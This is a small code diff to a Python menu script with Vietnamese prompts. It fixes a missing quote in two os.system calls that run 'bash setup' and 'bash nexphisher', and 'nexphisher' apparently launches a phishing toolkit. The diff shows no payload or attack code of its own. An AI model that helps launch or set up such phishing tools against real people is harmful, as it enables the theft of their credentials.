@@ -54,7 +54,7 @@ if ip == 'moi':
         install_sv=input('Nhập [1] hoặc [2]: ')
         if install_sv=='1':
             os.system('bash setup')
-            os.system('bash nexphisher)
+            os.system('bash nexphisher')
         if install_sv=='2':
             os.system('bash nexphisher')
 ############################################################################################    
@@ -80,6 +80,6 @@ if ip == 'cu':
         install_sv=input('Nhập [1] hoặc [2]: ')
         if install_sv=='1':
             os.system('bash setup')
-            os.system('bash nexphisher)
+            os.system('bash nexphisher')
         if install_sv=='2':
             os.system('bash nexphisher')          
